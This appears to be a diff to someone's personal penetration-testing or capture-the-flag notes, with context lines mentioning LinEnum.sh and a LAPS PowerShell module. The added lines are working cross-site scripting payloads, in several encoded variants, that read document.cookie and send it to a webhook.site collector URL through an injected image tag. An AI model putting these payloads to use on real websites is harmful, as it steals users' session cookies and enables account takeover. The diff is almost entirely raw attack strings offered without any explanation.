@@ -18,3 +18,26 @@ bash LinEnum.sh
 
 https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd.PS/AdmPwd.PS.psd1
 
+<script>
+	document.write('<img src="[URL]?c='+document.cookie+'" />');
+	</script>
+
+<script>document.write('<img src="https://webhook.site/343c0d6b-b0bb-488a-a276-a479c4c19221/?c='%2bdocument.cookie%2b'" />');</script>
+
+```
+<script>document.write('<img src="https://webhook.site/343c0d6b-b0bb-488a-a276-a479c4c19221/?c='%2bdocument.cookie%2b'"/>')</script>
+```
+
+```
+<script>document.write('<img src="https://webhook.site/343c0d6b-b0bb-488a-a276-a479c4c19221/?c='%2bdocument.cookie%2b'"/>')</script>
+```
+
+```xml
+<img src="[URL]?c=[COOKIE]"/>
+```
+
+```
+<img src="https://webhook.site/343c0d6b-b0bb-488a-a276-a479c4c19221?c=[COOKIE]"/>
+```
+
+https://webhook.site/343c0d6b-b0bb-488a-a276-a479c4c19221
